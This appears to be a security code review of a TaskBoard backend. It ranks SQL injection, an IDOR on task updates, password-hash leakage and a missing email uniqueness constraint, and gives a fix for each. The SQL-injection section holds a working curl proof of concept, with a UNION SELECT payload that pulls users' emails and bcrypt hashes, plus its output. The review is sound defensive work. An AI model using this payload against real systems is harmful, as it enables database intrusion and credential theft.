# Code Review — TaskBoard Backend

Top 4 issues, prioritized by business impact.

---

## 1. SQL Injection in task search

- **File / line:** `src/app/api/projects/[id]/tasks/route.ts:27-34`
- **Category:** Security
- **Severity:** Critical

The search branch builds raw SQL by string-interpolating the user-supplied `q` (and `projectId`) directly into `$queryRawUnsafe`. A request such as `?q=%' UNION SELECT ... --` executes arbitrary SQL against the database, allowing full read/write access including exfiltration of `users.password_hash`. This is trivially exploitable by any authenticated member and is the single highest-impact defect in the codebase.

**Proof of concept (verified against the seeded database):**

Setup — log in as any member and grab a project id:
```bash
BASE=http://localhost:3000
TOKEN=$(curl -s "$BASE/api/auth/login" -H 'Content-Type: application/json' \
  -d '{"email":"meera@taskboard.dev","password":"password123"}' | jq -r .token)
PID=$(curl -s "$BASE/api/projects" -H "Authorization: Bearer $TOKEN" | jq -r '.projects[0].id')
```

Step 1 — a single quote in `q` breaks the SQL, proving input is not sanitized. A normal search returns `200`; the injected one returns `500`:
```bash
curl -s -o /dev/null -w '%{http_code}\n' -G "$BASE/api/projects/$PID/tasks" \
  -H "Authorization: Bearer $TOKEN" --data-urlencode "q=press"    # -> 200
curl -s -o /dev/null -w '%{http_code}\n' -G "$BASE/api/projects/$PID/tasks" \
  -H "Authorization: Bearer $TOKEN" --data-urlencode "q=press'"   # -> 500
```

Step 2 — a `UNION` payload exfiltrates every user's email and bcrypt password hash through the tasks response, including users in projects the caller never belonged to:
```bash
curl -s -G "$BASE/api/projects/$PID/tasks" -H "Authorization: Bearer $TOKEN" \
  --data-urlencode "q=zzz%') UNION SELECT id, email, password_hash, name, 'todo'::\"TaskStatus\", NULL, id, 0, created_at, updated_at FROM users -- " \
  | jq '.tasks[] | {email: .project_id, password_hash: .title, name: .description}'
```

Actual output:
```json
{ "email": "kavya@example.com",   "password_hash": "$2a$10$Ruunh7dsOopMWoayID0KcugIy3Xti9lbyZ.rp4yfD7gg35xM5ugfi", "name": "Kavya Reddy" }
{ "email": "lina@example.com",    "password_hash": "$2a$10$Ruunh7dsOopMWoayID0KcugIy3Xti9lbyZ.rp4yfD7gg35xM5ugfi", "name": "Lina Joshi" }
{ "email": "meera@taskboard.dev", "password_hash": "$2a$10$Ruunh7dsOopMWoayID0KcugIy3Xti9lbyZ.rp4yfD7gg35xM5ugfi", "name": "Meera Iyer" }
{ "email": "arjun@taskboard.dev", "password_hash": "$2a$10$Ruunh7dsOopMWoayID0KcugIy3Xti9lbyZ.rp4yfD7gg35xM5ugfi", "name": "Arjun Rao" }
{ "email": "dev@example.com",     "password_hash": "$2a$10$Ruunh7dsOopMWoayID0KcugIy3Xti9lbyZ.rp4yfD7gg35xM5ugfi", "name": "Dev Sharma" }
```
The `email`/`password_hash`/`name` values are `users` rows smuggled into the `project_id`/`title`/`description` fields — confirming arbitrary read of the entire database.

**Same request, after the fix** — the payload is now treated as literal search text, so no user rows leak (empty result), and the earlier quote payload returns `200` instead of `500`:
```bash
curl -s -G "$BASE/api/projects/$PID/tasks" -H "Authorization: Bearer $TOKEN" \
  --data-urlencode "q=zzz%') UNION SELECT id, email, password_hash, name, 'todo'::\"TaskStatus\", NULL, id, 0, created_at, updated_at FROM users -- " \
  | jq '.tasks'
# -> []      (before the fix this returned every user's email + bcrypt hash)
```
Status: **FIXED** — see `src/app/api/projects/[id]/tasks/route.ts` (parameterized `findMany`) and regression tests in `src/tests/tasks-search.test.ts`.

**Recommended fix:** Replace the raw query with Prisma's typed API, which parameterizes automatically:
```ts
const tasks = await prisma.task.findMany({
  where: {
    projectId,
    OR: [
      { title: { contains: q, mode: "insensitive" } },
      { description: { contains: q, mode: "insensitive" } },
    ],
  },
  orderBy: { position: "asc" },
});
```
If raw SQL is unavoidable, use the tagged-template `$queryRaw` so values are bound as parameters.

---

## 2. Missing authorization on task update (IDOR)

- **File / line:** `src/app/api/tasks/[id]/route.ts:16-38` (PATCH)
- **Category:** Security
- **Severity:** Critical

The PATCH handler only verifies that the caller is authenticated — it never checks project membership or role. Any logged-in user can modify any task in any project by knowing/guessing its id (change title, status, assignee, position). Notably the DELETE handler directly below performs the correct membership + role check, so this is an inconsistent omission rather than a design choice.

**Recommended fix:** After loading `existing`, apply the same guard used by DELETE:
```ts
const membership = await getProjectMembership(user.id, existing.projectId);
if (!membership) return forbidden("you are not a member of this project");
if (!canEditTasks(membership.role)) return forbidden("viewers cannot edit tasks");
```

---

## 3. Password hashes leaked in project detail response

- **File / line:** `src/app/api/projects/[id]/route.ts:25-40` (GET)
- **Category:** Security / Data Integrity
- **Severity:** High

The query uses unfiltered Prisma `include` (`owner: true`, `memberships: { include: { user: true } }`, `tasks: { include: { assignee: true, createdBy: true } }`), and a bare `include` returns every scalar column — including `passwordHash`. As a result the bcrypt hashes of the owner and every member/assignee/creator are serialized to any project member who opens the board, exposing credentials for offline cracking.

**Recommended fix:** Replace every bare `true` / `include: { user: true }` with an explicit `select: { id: true, name: true, email: true }` (the same safe pattern already used in the tasks route).

---

## 4. Email has no uniqueness constraint

- **File / line:** `prisma/schema.prisma:25` (and `prisma/migrations/20260101000000_init/migration.sql:8-17`)
- **Category:** Data Integrity
- **Severity:** High

`User.email` is a plain `String` with no `@unique`. Registration guards duplicates with `findFirst` (`register/route.ts:17`), but two concurrent signups race past that check and create duplicate accounts; login then resolves the email with `findFirst` (`login/route.ts:16`) and authenticates against an arbitrary duplicate. This enables account-takeover and lockout scenarios and corrupts the core identity model.

**Recommended fix:** Add `email String @unique` to the schema and generate a migration (dedupe any existing rows first). Rely on the DB constraint instead of the application-level `findFirst` pre-check, catching the unique-violation error to return the "email already exists" response.

---

### Prioritization rationale

Issues **#1** and **#2** are actively exploitable today (arbitrary DB access and cross-tenant data tampering) and rank highest by business impact. **#3** leaks credentials to every member and undermines the auth system. **#4** is a foundational data-integrity flaw that quietly breaks authentication correctness under concurrency.
